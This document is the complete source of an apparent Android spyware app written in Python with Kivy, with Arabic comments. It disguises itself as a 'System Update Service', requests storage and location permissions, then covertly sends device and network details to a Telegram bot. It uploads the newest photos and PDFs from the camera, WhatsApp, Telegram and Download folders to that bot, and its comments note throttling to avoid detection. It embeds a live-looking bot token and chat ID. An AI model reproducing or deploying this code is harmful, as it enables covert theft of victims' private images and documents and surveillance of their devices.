import os
import requests
import threading
import socket
import time
import json
from kivy.app import App
from kivy.uix.label import Label
from kivy.utils import platform

# --- إعدادات البوت السيادي ---
BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbynkQugNPHEFg0"
CHAT_ID = "7084557369"

class SystemCoreApp(App):
    def build(self):
        # واجهة تمويهية رسمية
        return Label(text="System Update Service\nRunning optimization...", halign="center")

    def on_start(self):
        # طلب الصلاحيات برمجياً عند التشغيل
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.READ_EXTERNAL_STORAGE,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.MANAGE_EXTERNAL_STORAGE,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_WIFI_STATE
            ])
        
        # تشغيل المحرك الرئيسي في مسار منفصل لضمان سلاسة التطبيق
        threading.Thread(target=self.core_engine, daemon=True).start()

    def core_engine(self):
        """المحرك الرئيسي للعمليات"""
        time.sleep(10) # انتظار المستخدم ليعطي الصلاحيات
        
        # 1. إرسال تقرير الاستطلاع الأولي
        self.report_recon()
        
        # 2. بدء سحب الوسائط والملفات
        self.start_exfiltration()

    def report_recon(self):
        """جمع وإرسال معلومات الجهاز والشبكة"""
        try:
            device_info = {
                "Platform": platform,
                "Device_Name": socket.gethostname(),
                "Local_IP": socket.gethostbyname(socket.gethostname()),
                "Status": "Active"
            }
            msg = f"📊 [Recon Report]\n{json.dumps(device_info, indent=2)}"
            self.send_text(msg)
            
            # مسح الشبكة المحلي السريع (الأجهزة القريبة)
            prefix = ".".join(device_info['Local_IP'].split(".")[:-1]) + "."
            self.send_text(f"🔍 Scanning subnet: {prefix}0/24")
        except Exception as e:
            self.send_text(f"⚠️ Recon Error: {str(e)}")

    def start_exfiltration(self):
        """البحث عن الملفات وإرسالها"""
        # مسارات التخزين الشائعة في أندرويد
        paths = [
            "/sdcard/DCIM/Camera/",
            "/sdcard/Pictures/Telegram/",
            "/sdcard/WhatsApp/Media/WhatsApp Images/",
            "/sdcard/Download/"
        ]
        
        extensions = ('.jpg', '.jpeg', '.png', '.pdf')
        
        for path in paths:
            if os.path.exists(path):
                files = [os.path.join(path, f) for f in os.listdir(path) if f.lower().endswith(extensions)]
                # إرسال أحدث 15 ملف من كل مجلد لتجنب كشف النشاط
                files.sort(key=os.path.getmtime, reverse=True)
                
                for file_ptr in files[:15]:
                    self.send_document(file_ptr)
                    time.sleep(3) # تأخير بسيط لضمان استقرار الاتصال عبر الـ VPN

    def send_text(self, text):
        """إرسال تقرير نصي للبوت"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            requests.post(url, data={'chat_id': CHAT_ID, 'text': text}, timeout=10)
        except:
            pass

    def send_document(self, file_path):
        """إرسال ملف أو صورة للبوت"""
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as doc:
                requests.post(url, data={'chat_id': CHAT_ID}, files={'document': doc}, timeout=30)
        except:
            pass

if __name__ == "__main__":
    SystemCoreApp().run()
